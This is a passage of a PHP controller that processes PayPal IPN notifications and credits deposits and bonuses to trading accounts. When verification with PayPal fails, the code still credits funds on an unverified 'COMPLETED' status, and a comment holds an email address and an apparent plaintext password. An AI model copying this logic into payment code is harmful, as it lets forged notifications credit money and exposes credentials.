     * > This method handles the  Crediting of  the requested/transferred amount from their Paypal
     * Account to Client/Partner FM Account.
     * > Aside from crediting of amount, this function also triggers the other sub function like Auto Bonus Crediting, Sending of
     * Failed/Successful Deposit report and Returning of Agent and Cancellation of Bonus for NDB Accounts.
     *
     * # paypalNotify METHOD BEGIN #
     **/
    public function paypalNotify()
    {
        // Response from Paypal
        $response = '';
        foreach ($_POST as $key => $value) {
            //$value = urlencode(stripslashes($value));
            $response .= $key.' = '.$value.'<br/>';
        }

//        $response .= 'HTTP response code = ' . $http_response_header() . '<br/>';

        $raw_post_data = file_get_contents('php://input');
        $raw_post_array = explode('&', $raw_post_data);
        $myPost = [];
        foreach ($raw_post_array as $keyval) {
            $keyval = explode('=', $keyval);
            if (count($keyval) == 2) {
                $myPost[$keyval[0]] = urldecode($keyval[1]);
            }
        }
        // read the IPN message sent from PayPal and prepend 'cmd=_notify-validate'
        $req = 'cmd=_notify-validate';
        if (function_exists('get_magic_quotes_gpc')) {
            $get_magic_quotes_exists = true;
        }
        foreach ($myPost as $key => $value) {
            if ($get_magic_quotes_exists == true && get_magic_quotes_gpc() == 1) {
                $value = urlencode(stripslashes($value));
            } else {
                $value = urlencode($value);
            }
            $req .= "&$key=$value";
        }

        $decrypt_fields = FXPP::decrypt_data($this->input->post('custom', true), $this->encrypt_key);
        $custom_fields = [];
        $fields = explode(';', $decrypt_fields);
        foreach ($fields as $element) {
            $attributes = explode('=', $element);
            if (count($attributes) > 1) {
                $custom_fields[$attributes[0]] = $attributes[1];
            }
        }

        //Insert paypal Response
        $responsedata = [
            'response' => json_encode($_POST),
            'user_id' => $custom_fields['user_id'],
        ];

        $this->deposit_model->testresponsepaypal($responsedata);
        //end

        $paypal_gross = $this->input->post('mc_gross', true);
        $paypal_fee = $this->input->post('mc_fee', true);

        /* FXPP-6333 */
        $isMicro = $this->account_model->isMicro($custom_fields['user_id']);
        if ($isMicro) {
            $paypal_gross *= 100;
            $paypal_fee *= 100;
        }
        /* FXPP-6333 */

        $paypal_amount = $paypal_gross - $paypal_fee;
        $currency = $this->input->post('mc_currency', true);
        if ($custom_fields['login_type'] == 1) {
            $account = $this->partners_model->getAccountByUserId($custom_fields['user_id']);
            $account['mt_currency_base'] = $account['currency'];
        } else {
            $account = $this->account_model->getAccountByUserId($custom_fields['user_id']);
        }
        $mt_currency = strtoupper(trim($account['mt_currency_base']));

        if ($mt_currency == strtoupper($currency)) {
            $amount = $paypal_amount;
            $fee = $paypal_fee;
        } else {
            $amount = $this->get_convert_amount($currency, $paypal_amount, $mt_currency);
            $fee = $this->get_convert_amount($currency, $paypal_fee, $mt_currency);
        }

        $conv_amount = $this->get_convert_amount($mt_currency, $amount);

        $insertDepositFailed = [
            'transaction_id	' => $this->input->post('txn_id', true),
            'status	' => 0,
            'amount	' => $amount,
            'currency' => $mt_currency,
            'user_id' => $custom_fields['user_id'],
            'payment_date' => date('Y-m-d H:i:s', strtotime($this->input->post('payment_date', true))),
            'transaction_type' => 'PAYPAL',
            'payment_status	' => '',
            'currency_status' => '',
            'fee' => $fee,
            'isFailed' => 0,
            'type' => 'deposit-'.$isMicro.'-'.$custom_fields['bonus'],
        ];

        $data = [
            'transaction_id' => $this->input->post('txn_id', true),
            'reference_id' => $this->input->post('item_number', true),
            'status' => 0,
            'amount' => $amount,
            'currency' => $mt_currency,
            'user_id' => $custom_fields['user_id'],
            'payment_date' => date('Y-m-d H:i:s', strtotime($this->input->post('payment_date', true))),
            'note' => $this->input->post('item_name', true).'['.$account['mt_currency_base'].']',
            'transaction_type' => 'PAYPAL',
            'conv_amount' => $conv_amount,
        ];

        $conv_amount_fee = $fee;

        if ($paypal_fee > 0) {
            $conv_amount_fee = $this->get_convert_amount($mt_currency, $fee);

            $data_fee = [
                'transaction_id' => $this->input->post('txn_id', true),
                'reference_id' => $this->input->post('item_number', true),
                'status' => 0,
                'amount' => $fee,
                'currency' => $mt_currency,
                'user_id' => $custom_fields['user_id'],
                'payment_date' => date('Y-m-d H:i:s', strtotime($this->input->post('payment_date', true))),
                'note' => $this->input->post('item_name', true).'['.$account['mt_currency_base'].']',
                'transaction_type' => 'PAYPAL',
                'conv_amount' => '1.6',
            ];
        }

        $test_users = unserialize(TEST_USERS_DEPOSIT);
        if (in_array($custom_fields['user_id'], $test_users)) {
            $ch = curl_init('https://www.sandbox.paypal.com/cgi-bin/webscr');
        } else {
            $ch = curl_init('https://www.paypal.com/cgi-bin/webscr');
        }
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $req);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_FORBID_REUSE, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Connection: Close']);

        // In wamp-like environments that do not come bundled with root authority certificates,
        // please download 'cacert.pem' from "http://curl.haxx.se/docs/caextract.html" and set
        // the directory path of the certificate as shown below:
        // curl_setopt($ch, CURLOPT_CAINFO, dirname(__FILE__) . '/cacert.pem');

        if (!($res = curl_exec($ch))) {
            // error_log("Got " . curl_error($ch) . " when processing IPN data");

            if (strtoupper($this->input->post('payment_status', true)) == 'COMPLETED') {
                $queue_data = $data;

                if ($custom_fields['additional_bonus'] == 1) {
                    $queue_data['tenpercentbonus'] = 1;
                }

//                 if ($custom_fields['bonus'] == 'tenpb') {
//                    $queue_data['tenpercentbonus'] = 1;
//                }

                if ($custom_fields['bonus'] == 'twpb') {
                    $queue_data['twentypercentbonus'] = 1;
                }

                if ($custom_fields['bonus'] == 'tpb') {
                    $queue_data['thirtypercentbonus'] = 1;
                }
                if ($custom_fields['bonus'] == 'fpb') {
                    $queue_data['fiftypercentbonus'] = 1;
                }
                if ($custom_fields['bonus'] == 'hpb') {
                    $queue_data['hundredpercentbonus'] = 1;
                }
                // if ($custom_fields['bonus'] == 'rhpb') {
                //     $queue_data['hundred_percent_constant_bonus'] = 1;
                // }
                // if($custom_fields['bonus'] == 'hpb'){
                //     $queue_data['hundredpercentbonus'] = 1;
                // }
                $queue_data['fee'] = $fee;

                /*Duplicate validation check*/
                // Problem:  Paypal sometimes returns multiple complete status transaction
                // Solution: Saved only one complete  Paypal deposit status with unique transaction id in the deposit queue table
                // if transaction already exist from deposit queue then  exit from method;

                $condition = [
                    'transaction_id' => $queue_data['transaction_id'],
                    'reference_id' => $queue_data['reference_id'],
                    'transaction_type' => 'PAYPAL',
                    'status' => 2,
                ];

                if ($this->general_model->whereCondition('deposit_queue', $condition)) {
//                    $insertData= array('log'=>serialize($_POST),'ip'=>$this->input->ip_address(),'type'=>'PAYPAL_CURL');
//                    $this->general_model->insertmy('fasapay_log',$insertData);
                    return false;
                } else {
                    $IsInsertedPaymentQueue = $this->deposit_model->insertPaymentQueue($queue_data);
                }

                /*End Duplicate validation check*/

                if (!$IsInsertedPaymentQueue) {
                    $asset_user_docs=$this->config->item('asset_user_docs');
                    file_put_contents($asset_user_docs.'paypal.log', $response.PHP_EOL, FILE_APPEND);
                } else {
                    $payment_queue = $this->deposit_model->getPaymentQuequeByTranType('PAYPAL');
                    foreach ($payment_queue as $key => $payment) {
                        if (!$this->deposit_model->checkTransactionExist($payment['transaction_id'], 'PAYPAL')) {
                            $payment_conv_amount = $this->get_convert_amount($payment['currency'], $payment['amount']);
                            $payment_data = [
                                'transaction_id' => $payment['transaction_id'],
                                'reference_id' => $payment['reference_id'],
                                'status' => 2,
                                'amount' => $payment['amount'],
                                'currency' => $payment['currency'],
                                'user_id' => $payment['user_id'],
                                'payment_date' => $payment['payment_date'],
                                'note' => $payment['note'],
                                'transaction_type' => 'PAYPAL',
                                'conv_amount' => $payment_conv_amount,
                            ];
                            $config = [
                                'server' => 'live_new',
                            ];

                            $isbonusten = false;
                            $isbonustwenty = false;
                            $isbonusthirty = false;
                            $isbonusfifty = false;
                            $isbonushundred = false;
                            // $isbonushundredconstant = false;

//                            $WebService = new WebService($config);
                            if ($custom_fields['login_type'] == 1) {
                                $account = $this->partners_model->getAccountByUserId($payment['user_id']);
                                $account['account_number'] = $account['reference_num'];
                            } else {
                                $account = $this->account_model->getAccountByUserId($payment['user_id']);
                            }

                            $account_number = $account['account_number'];

//                            if (IPLoc::APIUpgradeDevIP()) {
                                $WebServiceNew = FXPP::DepositRealFund($account_number, $payment['amount'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
                                $requestResult = $WebServiceNew['requestResult'];
                                $ticket = $WebServiceNew['ticket'];
//                            } else {
//                                $WebService->update_live_deposit_balance($account_number, $payment['amount'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
//                                $requestResult = $WebService->request_status;
//                                $ticket = $WebService->get_result('Ticket');
//                            }

                            if ($requestResult === 'RET_OK') {
                                $payment_data['mt_ticket'] = $ticket;

                                // Back Agent of Client
                               // FXPP::BackAgentOfAccount($account_number);

                                if ($payment['tenpercentbonus'] == 1) {
                                    $isbonusten = true;
                                }

                                if (IPLoc::Office()) {
                                    if ($payment['twentypercentbonus'] == 1) {
                                        $isbonustwenty = true;
                                        // $payment_data['twentypercentbonus'] = 1;
                                    }
                                }

                                if ($payment['thirtypercentbonus'] == 1) {
                                    $isbonusthirty = true;
                                    // $payment_data['thirtypercentbonus'] = 1;
                                }

                                // if($payment['user_id'] <> '112913') {
                                if ($payment['fiftypercentbonus'] == 1) {
                                    $isbonusfifty = true;
                                    //  $payment_data['fiftypercentbonus'] = 1;
                                }

                                if ($payment['hundredpercentbonus'] == 1) {
                                    $isbonushundred = true;
                                    //  $payment_data['hundredpercentbonus'] = 1;
                                }

                                // if ($payment['hundred_percent_constant_bonus'] == 1) {
                                //     $isbonushundredconstant = true;
                                //     $payment_data['hundred_percent_constant_bonus'] = 1;
                                // }
                                // }
                                // if($payment['hundredpercentbonus'] == 1){
                                //     FXPP::DepositBonus($custom_fields['user_id'], $account_number, $paypal_gross, 'paypal', 'hpb', $data['transaction_id']);
                                // }

                                $WebService2 = new WebService($config);
                                $WebService2->request_live_account_balance($account_number);
                                if ($WebService2->request_status === 'RET_OK') {
                                    $balance = $WebService2->get_result('Balance');
                                    if ($custom_fields['login_type'] == 1) {
                                        $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                                    } else {
                                        $this->account_model->updateAccountBalance($account_number, $balance);
                                    }
                                    //  ////FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
                                } else {
                                    $insertDepositFailed['comment'] = $WebService2->request_status;
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }
                            } else {
                                $insertDepositFailed['comment'] = $requestResult;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }

                            $isInsertPayment = $this->deposit_model->insertPayment($payment_data);

                            $payment_conv_amount_fee = 0;
                            if ($payment['fee'] > 0) {
                                $payment_conv_amount_fee = $this->get_convert_amount($payment['currency'], $payment['fee']);
                                $payment_data_fee = [
                                    'transaction_id' => $payment['transaction_id'],
                                    'reference_id' => $payment['reference_id'],
                                    'status' => 2,
                                    'amount' => $payment['fee'],
                                    'currency' => $payment['currency'],
                                    'user_id' => $payment['user_id'],
                                    'payment_date' => $payment['payment_date'],
                                    'note' => $payment['note'],
                                    'transaction_type' => 'PAYPAL',
                                    'conv_amount' => $payment_conv_amount_fee,
                                ];
                                $config = [
                                    'server' => 'live_new',
                                ];
//                                $WebService = new WebService($config);

//                                if (IPLoc::APIUpgradeDevIP()) {
                                    $WebServiceNew = FXPP::DepositRealFund($account_number, $payment['fee'], $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
                                    $requestResult = $WebServiceNew['requestResult'];
                                    $ticket = $WebServiceNew['ticket'];
//                                } else {
//                                    $WebService->update_live_deposit_balance($account_number, $payment['fee'], $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
//                                    $requestResult = $WebService->request_status;
//                                    $ticket = $WebService->get_result('Ticket');
//                                }

                                if ($requestResult === 'RET_OK') {
                                    $payment_data_fee['mt_ticket'] = $ticket;

                                    $WebService2 = new WebService($config);
                                    $WebService2->request_live_account_balance($account_number);
                                    if ($WebService2->request_status === 'RET_OK') {
                                        $balance = $WebService2->get_result('Balance');
                                        if ($custom_fields['login_type'] == 1) {
                                            $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                                        } else {
                                            $this->account_model->updateAccountBalance($account_number, $balance);
                                        }
                                        //  ////FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
                                    } else {
                                        $insertDepositFailed['comment'] = $WebService2->request_status;
                                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                    }
                                } else {
                                    $insertDepositFailed['comment'] = $requestResult;
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }
                                $this->deposit_model->insertPayment($payment_data_fee);
                            }

                            if ($isbonusten == true) {
//                                FXPP::DepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'tenpb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'tenpb', $payment['transaction_id'], true);
                            }

                            if ($isbonustwenty == true) {
//                                FXPP::DepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'twpb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'twpb', $payment['transaction_id'], false);
                            }

                            if ($isbonusthirty == true) {
//                                FXPP::DepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'tpb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'tpb', $payment['transaction_id'], false);
                            }
                            if ($isbonusfifty == true) {
//                                FXPP::DepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'fpb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'fpb', $payment['transaction_id'], false);
                            }
                            if ($isbonushundred == true) {
//                                FXPP::Deposit100PercentBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'hplb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'hplb', $payment['transaction_id'], false);
                            }
                            // if($isbonushundredconstant == true){
                            //      FXPP::DepositRegular100PercentBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'rhpb', $payment['transaction_id']);
                            // }

                            $bonuses = FXPP::getAccountBonusByType($account_number);
                            $paypal_amount = $payment['amount'] + $payment['fee'];
                            $RequestLogintype = $this->account_model->getAccountLoginType($payment['user_id']);
                            if ($RequestLogintype['login_type'] != 1) {
                                if ($paypal_amount > 0 and $bonuses[2] > 0) {
                                    FXPP::BonusProfitCancellation($payment['user_id'], $account_number, $paypal_amount, $payment['transaction_id']);
                                }
                            }

                            // Bonus Profit Logs**/
                            $ndbProfitLogs = [
                                'Account_number' => $account_number,
                                'DepAmount' => $paypal_amount,
                                'UserId' => $payment['user_id'],
                                'TransactionId' => $payment['transaction_id'],
                                'ndbbonus' => $bonuses[2],
                            ];
                            $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                            $insertProfitLogs = [
                                'logs' => $encodeNdbProfitLogs,
                                'User_Id' => $payment['user_id'],
                            ];

                            $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                            /**  Use original amount for Cent accounts**/
                            $processed_amount = floatval($payment_conv_amount) + floatval($payment_conv_amount_fee);
                            $isMicro = $this->account_model->isMicro($payment['user_id']);
                            if ($isMicro) {
                                $processed_amount /= 100;
                            }
                            /* End **/

                            /* Send successful email deposit to auto-reports **/
                            $this->sendEmailAfterSuccessDeposit('PayPal', $processed_amount, $account_number, $payment['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
                            /* End **/
                        }
                    }
                }
            } else {
                $this->deposit_model->insertPayment($data);
                if ($paypal_fee > 0) {
                    $this->deposit_model->insertPayment($data_fee);
                }
                if ($custom_fields['login_type'] == 1) {
                    $account_detail = $this->partners_model->getAccountByUserId($custom_fields['user_id']);
                    $account_detail['account_number'] = $account_detail['reference_num'];
                } else {
                    $account_detail = $this->account_model->getAccountByUserId($custom_fields['user_id']);
                }
                $stat = strtoupper($this->input->post('payment_status', true)); //strtoupper($this->input->post('payment_status')) . ': ' . strtoupper($this->input->post('reason_code'));
                $data = [
                    'account_number' => $account_detail['account_number'],
                    'type' => 'PayPal',
                    'reason' => $stat,
                ];
                $this->sendEmailFailedDeposit($data);
            }
            curl_close($ch);
            exit;
        }
        curl_close($ch);

        // post back to PayPal system to validate
//        $header = "POST /cgi-bin/webscr HTTP/1.0\r\n";
//        $header .= "Content-Type: application/x-www-form-urlencoded\r\n";
//        $header .= "Content-Length: " . strlen($req) . "\r\n\r\n";
//
//        $fp = fsockopen ('ssl://ipnpb.paypal.com', 443, $errno, $errstr, 30);
//
//        if (!$fp) {
//
//        } else {

//        }

        if (strtoupper($this->input->post('payment_status', true)) == 'COMPLETED') {
//                fputs ($fp, $header . $req);
//                while (!feof($fp)) {
//                    $res = fgets ($fp, 1024);
            if (strcmp($res, 'VERIFIED') == 0) {
                $response .= '<br/>VERIFIED:'.$res;
//                $data['status'] = 2;
                $queue_data = $data;

//                 if ($custom_fields['bonus'] == 'tenpb') {
//                    $queue_data['tenpercentbonus'] = 1;
//                }

                if ($custom_fields['additional_bonus'] == 1) {
                    $queue_data['tenpercentbonus'] = 1;
                }

                if ($custom_fields['bonus'] == 'twpb') {
                    $queue_data['twentypercentbonus'] = 1;
                }

                if ($custom_fields['bonus'] == 'tpb') {
                    $queue_data['thirtypercentbonus'] = 1;
                }
                if ($custom_fields['bonus'] == 'fpb') {
                    $queue_data['fiftypercentbonus'] = 1;
                }
                if ($custom_fields['bonus'] == 'hpb') {
                    $queue_data['hundredpercentbonus'] = 1;
                }
                // if ($custom_fields['bonus'] == 'rhpb') {
                //    $queue_data['hundred_percent_constant_bonus'] = 1;
                // }
                // if($custom_fields['bonus'] == 'hpb'){
                //     $queue_data['hundredpercentbonus'] = 1;
                // }

                /*Duplicate validation check*/

                $condition = [
                    'transaction_id' => $queue_data['transaction_id'],
                    'reference_id' => $queue_data['reference_id'],
                    'transaction_type' => 'PAYPAL',
                ];

                $queue_data['fee'] = $fee;
                if ($this->general_model->whereCondition('deposit_queue', $condition)) {
//                    $insertData= array('log'=>serialize($_POST),'ip'=>$this->input->ip_address(),'type'=>'PAYPAL');
//                    $this->general_model->insertmy('fasapay_log',$insertData);
//                    return false;
                } else {
                    $IsInsertedPaymentQueue = $this->deposit_model->insertPaymentQueue($queue_data);
                }

                /*End Duplicate validation check*/

                if (!$IsInsertedPaymentQueue) {
                    $asset_user_docs=$this->config->item('asset_user_docs');
                    file_put_contents($asset_user_docs.'paypal.log', $response.PHP_EOL, FILE_APPEND);
                } else {
                    $payment_queue = $this->deposit_model->getPaymentQuequeByTranType('PAYPAL');
                    foreach ($payment_queue as $key => $payment) {
                        if (!$this->deposit_model->checkTransactionExist($payment['transaction_id'], 'PAYPAL')) {
                            $payment_conv_amount = $this->get_convert_amount($payment['currency'], $payment['amount']);
                            $payment_data = [
                                'transaction_id' => $payment['transaction_id'],
                                'reference_id' => $payment['reference_id'],
                                'status' => 2,
                                'amount' => $payment['amount'],
                                'currency' => $payment['currency'],
                                'user_id' => $payment['user_id'],
                                'payment_date' => $payment['payment_date'],
                                'note' => $payment['note'],
                                'transaction_type' => 'PAYPAL',
                                'conv_amount' => $payment_conv_amount,
                            ];
                            $config = [
                                'server' => 'live_new',
                            ];

                            $isbonusten2 = false;
                            $isbonustwenty2 = false;
                            $isbonusthirty2 = false;
                            $isbonusfifty2 = false;
                            $isbonushundred2 = false;
                            // $isbonushundredconstant2 = false;

//                            $WebService = new WebService($config);
                            if ($custom_fields['login_type'] == 1) {
                                $account = $this->partners_model->getAccountByUserId($payment['user_id']);
                                $account['account_number'] = $account['reference_num'];
                            } else {
                                $account = $this->account_model->getAccountByUserId($payment['user_id']);
                            }
                            $account_number = $account['account_number'];

//                            if (IPLoc::APIUpgradeDevIP()) {
                                $WebServiceNew = FXPP::DepositRealFund($account_number, $payment['amount'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
                                $requestResult = $WebServiceNew['requestResult'];
                                $ticket = $WebServiceNew['ticket'];
//                            } else {
//                                $WebService->update_live_deposit_balance($account_number, $payment['amount'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
//                                $requestResult = $WebService->request_status;
//                                $ticket = $WebService->get_result('Ticket');
//                            }

                            if ($requestResult === 'RET_OK') {
                                $payment_data['mt_ticket'] = $ticket;

                                // Back Agent of Client
                               // FXPP::BackAgentOfAccount($account_number);

                                if ($payment['tenpercentbonus'] == 1) {
                                    $isbonusten2 = true;
                                }

                                if (IPLoc::Office()) {
                                    if ($payment['twentypercentbonus'] == 1) {
                                        $isbonustwenty2 = true;
                                        // $payment_data['twentypercentbonus'] = 1;
                                    }
                                }
                                if ($payment['thirtypercentbonus'] == 1) {
                                    $isbonusthirty2 = true;
                                    // $payment_data['thirtypercentbonus'] = 1;
                                }
                                // if($payment['user_id'] <> '112913') {
                                if ($payment['fiftypercentbonus'] == 1) {
                                    $isbonusfifty2 = true;
                                    // $payment_data['fiftypercentbonus'] = 1;
                                }
                                if ($payment['hundredpercentbonus']) {
                                    $isbonushundred2 = true;
                                    // $payment_data['hundredpercentbonus'] = 1;
                                }
                                // if ($payment['hundred_percent_constant_bonus'] == 1) {
                                //     $isbonushundredconstant2 = true;
                                //     $payment_data['hundred_percent_constant_bonus'] = 1;
                                // }
                                //}
                                // if($payment['hundredpercentbonus'] == 1){
                                //     FXPP::DepositBonus($custom_fields['user_id'], $account_number, $paypal_gross, 'paypal', 'hpb', $data['transaction_id']);
                                // }

                                $WebService2 = new WebService($config);
                                $WebService2->request_live_account_balance($account_number);
                                if ($WebService2->request_status === 'RET_OK') {
                                    $balance = $WebService2->get_result('Balance');
                                    $this->account_model->updateAccountBalance($account_number, $balance);
                                //  ////FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
                                } else {
                                    $insertDepositFailed['comment'] = $WebService2->request_status;
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }
                            } else {
                                $insertDepositFailed['comment'] = $requestResult;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }

                            $isInsertPayment2 = $this->deposit_model->insertPayment($payment_data);
                            $payment_conv_amount_fee = 0;
                            if ($payment['fee'] > 0) {
                                $payment_conv_amount_fee = $this->get_convert_amount($payment['currency'], $payment['fee']);
                                $payment_data_fee = [
                                    'transaction_id' => $payment['transaction_id'],
                                    'reference_id' => $payment['reference_id'],
                                    'status' => 2,
                                    'amount' => $payment['fee'],
                                    'currency' => $payment['currency'],
                                    'user_id' => $payment['user_id'],
                                    'payment_date' => $payment['payment_date'],
                                    'note' => $payment['note'],
                                    'transaction_type' => 'PAYPAL',
                                    'conv_amount' => $payment_conv_amount_fee,
                                ];
                                $config = [
                                    'server' => 'live_new',
                                ];
//                                $WebService = new WebService($config);
                                $account_number = $account['account_number'];

//                                if (IPLoc::APIUpgradeDevIP()) {
                                    $WebServiceNew = FXPP::DepositRealFund($account_number, $payment['fee'], $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
                                    $requestResult = $WebServiceNew['requestResult'];
                                    $ticket = $WebServiceNew['ticket'];
//                                } else {
//                                    $WebService->update_live_deposit_balance($account_number, $payment['fee'], $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
//                                    $requestResult = $WebService->request_status;
//                                    $ticket = $WebService->get_result('Ticket');
//                                }

                                if ($requestResult === 'RET_OK') {
                                    $payment_data_fee['mt_ticket'] = $ticket;

                                    $WebService2 = new WebService($config);
                                    $WebService2->request_live_account_balance($account_number);
                                    if ($WebService2->request_status === 'RET_OK') {
                                        $balance = $WebService2->get_result('Balance');
                                        if ($custom_fields['login_type'] == 1) {
                                            $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                                        } else {
                                            $this->account_model->updateAccountBalance($account_number, $balance);
                                        }

                                        //  ////FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
                                    } else {
                                        $insertDepositFailed['comment'] = $WebService2->request_status;
                                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                    }
                                } else {
                                    $insertDepositFailed['comment'] = $requestResult;
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }
                            }

                            $this->deposit_model->insertPayment($payment_data_fee);

                            if ($isbonusten2 == true) {
//                                FXPP::DepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'tenpb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'tenpb', $payment['transaction_id'], true);
                            }

                            if ($isbonustwenty2 == true) {
//                                FXPP::DepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'twpb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'twpb', $payment['transaction_id'], false);
                            }

                            if ($isbonusthirty2 == true) {
//                                FXPP::DepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'tpb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'tpb', $payment['transaction_id'], false);
                            }
                            if ($isbonusfifty2 == true) {
//                                FXPP::DepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'fpb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'fpb', $payment['transaction_id'], false);
                            }
                            if ($isbonushundred2 == true) {
//                                FXPP::Deposit100PercentBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'hplb', $payment['transaction_id']);
                                self::applyDepositBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'hplb', $payment['transaction_id'], false);
                            }
                            // if($isbonushundredconstant2 == true){
                            //      FXPP::DepositRegular100PercentBonus($payment['user_id'], $account_number, $payment['amount'] + $payment['fee'], 'paypal', 'rhpb', $payment['transaction_id']);
                            // }

                            $bonuses = FXPP::getAccountBonusByType($account_number);
                            $paypal_amount = $payment['amount'] + $payment['fee'];
                            $RequestLogintype = $this->account_model->getAccountLoginType($payment['user_id']);
                            if ($RequestLogintype['login_type'] != 1) {
                                if ($paypal_amount > 0 and $bonuses[2] > 0) {
                                    FXPP::BonusProfitCancellation($payment['user_id'], $account_number, $paypal_amount, $payment['transaction_id']);
                                }
                            }

                            // Bonus Profit Logs**/
                            $ndbProfitLogs = [
                                'Account_number' => $account_number,
                                'DepAmount' => $payment['amount'] + $payment['fee'],
                                'UserId' => $payment['user_id'],
                                'TransactionId' => $payment['transaction_id'],
                                'ndbbonus' => $bonuses[2],
                            ];
                            $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                            $insertProfitLogs = [
                                'logs' => $encodeNdbProfitLogs,
                                'User_Id' => $payment['user_id'],
                            ];

                            $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                            /**  Use original amount for Cent accounts**/
                            $processed_amount = floatval($payment_conv_amount) + floatval($payment_conv_amount_fee);
                            $isMicro = $this->account_model->isMicro($payment['user_id']);
                            if ($isMicro) {
                                $processed_amount /= 100;
                            }
                            /* End **/

                            /* Send successful email deposit to auto-reports **/
                            $this->sendEmailAfterSuccessDeposit('PayPal', $processed_amount, $account_number, $payment['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$payment['transaction_id']);
                            /* End **/
                        }
                    }
                }
            } elseif (strcmp($res, 'INVALID') == 0) {
                $response .= '<br/>INVALID:'.$res.'<br/>'.$req;
                $this->deposit_model->insertPayment_v3('paypal_pending_transaction', $data);
                if ($paypal_fee > 0) {
                    $this->deposit_model->insertPayment_v3('paypal_pending_transaction', $data_fee);
                }

                if ($custom_fields['login_type'] == 1) {
                    $account_detail = $this->partners_model->getAccountByUserId($custom_fields['user_id']);
                    $account_detail['account_number'] = $account_detail['reference_num'];
                } else {
                    $account_detail = $this->account_model->getAccountByUserId($custom_fields['user_id']);
                }
                $data = [
                    'account_number' => $account_detail['account_number'],
                    'type' => 'PayPal',
                    'reason' => $response,
                ];
                $this->sendEmailFailedDeposit_v2($data); //test
            }

//                }
//                fclose ($fp);

//            $email_data = array(
//                'full_name' => 'moniruzzaman',
//                'email' => 'vela.nightclad@gmail.com',
//                'password' => '14563333',
//                'account_number' => $response
//            );
//            $subject = "Paypal details";
//            $config = array(
//                'mailtype' => 'html'
//            );
//            $this->general_model->sendEmail('welcome-html', $subject, $email_data['email'], $email_data, $config);
        } else {
            $this->deposit_model->insertPayment_v3('paypal_pending_transaction', $data);
            if ($paypal_fee > 0) {
                $this->deposit_model->insertPayment_v3('paypal_pending_transaction', $data_fee);
            }
            if ($custom_fields['login_type'] == 1) {
